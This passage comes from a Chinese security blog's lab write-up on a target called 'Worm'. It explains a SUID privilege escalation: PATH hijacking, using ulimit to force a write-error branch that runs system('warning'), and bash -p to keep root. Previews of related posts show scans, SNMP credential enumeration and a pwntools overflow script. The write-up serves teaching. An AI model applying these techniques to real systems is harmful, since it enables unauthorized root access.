步骤8：触发程序执行</span><br><span class="line">Failed to write to file: File too large  # 触发写入失败</span><br><span class="line">root@Worm:/tmp# ls -al        # 成功拿到root shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>PATH 环境变量劫持：</strong> 这是提权的第一步。Linux 系统在执行没有绝对路径的命令时，会按照 <code>PATH</code> 变量定义的目录顺序逐一查找。通过 <code>export PATH=/tmp:$PATH</code>，成功地将 <code>/tmp</code> 目录置于系统目录（如 <code>/bin</code>）之前。当程序试图调用 <code>warning</code> 时，它会优先执行你存放在 <code>/tmp</code> 下的同名恶意脚本，而不是系统预期的程序。</p>
+<p><strong>利用 ulimit 强制触发错误分支：</strong> 源码逻辑显示，只有当 <code>open</code> 或 <code>write</code> 失败时，程序才会进入执行 <code>system(&quot;warning&quot;)</code> 的错误处理分支。在没有写权限限制的情况下，程序会正常写入文件并退出。使用了<code>ulimit -f 0</code>（限制文件写入大小为 0）并配合 <code>trap &#39;&#39; SIGXFSZ</code>（忽略信号导致的崩溃），迫使 <code>write()</code> 函数返回失败。成功诱导程序走向了预设的漏洞分支。</p>
+<p><strong>绕过 Shell 的安全保护机制：</strong> 现代 Linux 的 Shell（如 Dash）具备安全防护，当检测到有效用户 ID（EUID）与真实用户 ID（UID）不匹配时会自动放弃 Root 权限。在脚本中使用 <code>#!/bin/bash</code> 配合 <code>/bin/bash -p</code>（特权模式标志）成功绕过了这一限制。<code>-p</code> 参数强制 Bash 保留 SUID 带来的 Root 身份，从而让你直接进入具有最高权限的交互式 Shell。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Xiaxiaran</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/">http://example.com/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/git%E6%B3%84%E9%9C%B2/">git泄露</a><a class="post-meta__tags" href="/tags/SUID%E6%8F%90%E6%9D%83/">SUID提权</a></div><div class="post-share"><div class="social-share" data-image="/images/1.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/22/114-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="114_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">114_提权处理</div></div><div class="info-2"><div class="info-item-1">一、信息收集首先进行端口扫描 123456789101112nmap -p- 192.168.0.111             Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 08:02 ESTNmap scan report for 192.168.0.111 (192.168.0.111)Host is up (0.0013s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:00:02:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds  发现是常见的80端口和22端口 接下来进行目录扫描 1234567891011121314151617181...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/18/ezpwn-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="ezpwn_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-18</div><div class="info-item-2">ezpwn_提权处理</div></div><div class="info-2"><div class="info-item-1">首先扫描端口 1nmap -sV -T4 -p- 192.168.43.100   发现开了一个6538的端口 下载overflow文件并用idapro打开 用f5查看伪代码并进入start里面 1234567891011int __cdecl start()&#123;  char a[12]; // [rsp+Fh] [rbp-11h] BYREF  char c[2]; // [rsp+1Bh] [rbp-5h]  char b[3]; // [rsp+1Dh] [rbp-3h]  gets(a);  //当输入长度超过a的大小时会溢出覆盖c和b的内存  if ( b[1] == 115 &amp;&amp; c[1] == 112 )    port();  return 0;&#125;  这里我们利用栈溢出漏洞来写一个pwn脚本 12345678910111213141516171819from pwn import *proc = remote(&#x27;192.168.43.100&#x27;, 9999)# 构造 payload：# a[12] + 填充到c[...</div></div></div></a><a class="pagination-related" href="/2026/01/21/113-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="113_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-21</div><div class="info-item-2">113_提权处理</div></div><div class="info-2"><div class="info-item-1">一、信息收集扫描tcp udp 1nmap -sV -T4 -p- 192.168.0.105  1sudo nmap -sU -F 192.168.0.105    扫到了一个161端口 161端口是常见的SNMP服务 很多设备的SNMP配置了默认的社区字符串（如public&#x2F;private） 用工具读取系统信息 用户列表 甚至修改配置 1.用snmpwalk枚举系统信息 1snmpwalk -v2c -c public 192.168.0.105  2.用onesixtyone 爆破社区字符串 1onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.0.105   可以看到用户名和密码 welcome：mMOq2WWONQiiY8TinSRF 接下来用ssh进行连接 1ssh welcome@192.168.0.105    二、提取处理用sudo -l可以看到存在&#x2F;opt&#x2F;113.sh 123456789welcom...</div></div></div></a><a class="pagination-related" href="/2026/01/22/114-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="114_提权处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-22</div><div class="info-item-2">114_提权处理</div></div><div class="info-2"><div class="info-item-1">一、信息收集首先进行端口扫描 123456789101112nmap -p- 192.168.0.111             Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 08:02 ESTNmap scan report for 192.168.0.111 (192.168.0.111)Host is up (0.0013s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:00:02:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds  发现是常见的80端口和22端口 接下来进行目录扫描 1234567891011121314151617181...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/images/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Xiaxiaran</div><div class="author-info-description">Welcome to my first blog</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xiaxiaran"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xiaxiaran/xiaxiaran.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2732148214&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E9%A6%96%E5%85%88%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">1.首先进行端口扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">2.目录扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8git%E6%B3%84%E9%9C%B2"><span class="toc-text">3.利用git泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86"><span class="toc-text">二、提权处理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-SUID%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86"><span class="toc-text">1.SUID提权处理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">2.文件下载</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%A7%A6%E5%8F%91%E7%A8%8B%E5%BA%8F%E6%8B%BF%E5%88%B0%E6%9D%83%E9%99%90"><span class="toc-text">3.触发程序拿到权限</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="worm_提权处理">worm_提权处理</a><time datetime="2026-01-24T13:08:40.000Z" title="Created 2026-01-24 21:08:40">2026-01-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/22/114-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="114_提权处理">114_提权处理</a><time datetime="2026-01-22T13:08:40.000Z" title="Created 2026-01-22 21:08:40">2026-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/113-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/" title="113_提权处理">113_提权处理</a><time datetime="2026-01-21T13:08:40.000Z" title="Created 2026-01-21 21:08:40">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/22/%E7%95%99%E8%A8%80%E6%9D%BF/" title="留言板">留言板</a><time datetime="2025-12-22T01:50:25.000Z" title="Created 2025-12-22 09:50:25">2025-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/22/%E5%8E%9F%E5%88%9B_%E5%96%9D%E8%8C%B6%E6%AD%87%E6%AD%87/" title="喝茶歇歇">喝茶歇歇</a><time datetime="2025-12-22T00:43:52.000Z" title="Created 2025-12-22 08:43:52">2025-12-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Xiaxiaran</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'xiaxiaran/xiaxiaran.github.io',
+      'data-repo-id': 'R_kgDOQoya5A',
+      'data-category-id': 'DIC_kwDOQoya5M4Cz_cf',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
